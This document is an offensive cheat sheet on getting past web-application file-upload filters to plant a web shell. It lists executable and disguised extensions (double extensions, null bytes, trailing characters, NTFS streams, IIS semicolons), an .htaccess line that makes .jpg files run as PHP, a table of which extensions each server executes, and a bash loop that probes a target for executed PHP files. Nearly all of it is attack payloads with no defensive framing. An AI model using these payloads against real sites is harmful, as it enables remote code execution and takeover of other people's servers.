# File Upload Extension Bypass

## PHP Extensions
```
.php, .php3, .php4, .php5, .php7, .phtml, .pht, .phps, .phar, .pgif
.php.jpg, .php.png          # Double extension
.php\x00.jpg                # Null byte (older systems)
.php%00.jpg                 # URL-encoded null
.Php, .pHp                  # Case variation
```

## Other Web Shells
```
.asp, .aspx, .jsp, .jspx, .cfm, .pl, .py, .rb
```

## Hidden Extensions
```
shell.php.                  # Trailing dot
shell.php                   # Trailing space
shell.php                   # Trailing tab
shell.php                   # Trailing newline
shell.php:.jpg              # NTFS stream
shell.php::$DATA            # NTFS alternate data stream
shell.php::$INDEX_ALLOCATION
shell.jpg.php               # Reversed extension
shell.php;.jpg              # IIS semicolon
shell.php%20                # URL encoded space
shell.p.h.p                 # Dotted
```

## Apache .htaccess Bypass
```apache
AddType application/x-httpd-php .jpg
# Upload .htaccess then .jpg shell
```

## Nginx Configuration Bypass
```nginx
# If upload_dir/upload_file is passed to fastcgi
# Upload .jpg containing PHP code
```

## Content-Type Mapping
```
image/jpeg → .jpg, .jpeg, .pjpeg
image/png  → .png
image/gif  → .gif
text/plain → .txt
application/pdf → .pdf
```

## Web Server Behavior
| Server | Extension Execution |
|--------|---------------------|
| Apache | .php, .php3, .php4, .php5, .phtml, .pht |
| Nginx | Depends on fastcgi_split_path_info |
| IIS | .asp, .aspx, .cer, .cdx |
| Tomcat | .jsp, .jspx, .war |
| Node.js | Depends on framework |

## Test Script
```bash
#!/bin/bash
# Test which extensions are executed
for ext in php php3 php4 php5 phtml pht phar; do
    echo "<?php echo 'EXECUTED_'.$ext; ?>" > "test.$ext"
    curl -s "https://target.com/uploads/test.$ext"
done
```
